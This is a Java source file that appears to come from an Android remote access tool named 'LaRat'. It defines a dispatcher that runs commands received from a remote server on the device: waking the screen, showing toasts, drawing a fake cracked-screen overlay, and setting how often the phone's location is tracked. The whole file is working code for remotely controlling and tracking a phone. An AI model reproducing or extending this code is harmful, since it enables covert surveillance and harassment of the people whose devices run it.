package com.c4wd.command;

import android.content.Context;
import android.os.AsyncTask;
import android.os.PowerManager;
import android.widget.Toast;

import com.c4wd.larat.LaRatLocationManager;

import java.util.HashMap;

/**
 * Created by cory on 10/4/15.
 */
public class Command {

    public static HashMap<String, AsyncTask> commandList;

    public static AsyncTask getTask(String id) {
        return commandList.get(id);
    }

    public static void initCommands() {
        if (Command.commandList == null) {
            Command.commandList = new HashMap<String, AsyncTask>();

            //Adding commands is simple
            //commandList.put("String of command that is sent from the server", new (Task class)());

            commandList.put("ScreenOn", new ScreenOnTask());
            commandList.put("SetLocationInterval", new SetLocationIntervalTask());
            commandList.put("Toast", new ToastTask());
            commandList.put("OpenGL", new DrawingTasks.OpenGLViewTask());
            commandList.put("Pong", new DrawingTasks.PongTask());
            commandList.put("ScreenCrack", new DrawingTasks.CrackScreenTask());
        }
    }

    //The following are example commands that can be ran

    public static class ScreenOnTask extends AsyncTask<Object, Void, String> {
        @Override
        protected String doInBackground(Object... ctx) {
            PowerManager pm = (PowerManager) ((CommandContext)ctx[0]).getContext().getSystemService(Context.POWER_SERVICE);
            final PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK |PowerManager.ACQUIRE_CAUSES_WAKEUP |PowerManager.ON_AFTER_RELEASE, "");
            wl.acquire();
            return "This is an example return string";
        }
        @Override
        protected void onPostExecute(String result) {
            //This is where you can send a request to the server with update information
                // in this case, the string returned from doInBackground
        }
        @Override
        protected void onPreExecute() {}
        @Override
        protected void onProgressUpdate(Void... values) {}
    }

    public static class ToastTask extends AsyncTask<Object, Void, Object> {

        private CommandContext context;

        @Override
        protected Object doInBackground(Object... objects) {
            context = (CommandContext)objects[0];
            return null;
        }

        @Override
        protected void onPostExecute(Object o) {
            Toast.makeText(context.getContext(),
                    context.getArgument(0).toString(),
                    context.getArgument(1).toString().equals("LONG") ? Toast.LENGTH_LONG : Toast.LENGTH_SHORT
            ).show();
        }
    }

    public static class SetLocationIntervalTask extends AsyncTask<Object, Void, Void>  {

        @Override
        protected Void doInBackground(Object... objects) {
            CommandContext context = (CommandContext)objects[0];
            long interval = Long.parseLong(context.getArgument(0).toString());
            LaRatLocationManager.LOCATION_REQUEST_INTERVAL = interval;
            LaRatLocationManager.startLocationService(context.getContext());
            return null;
        }
    }
}
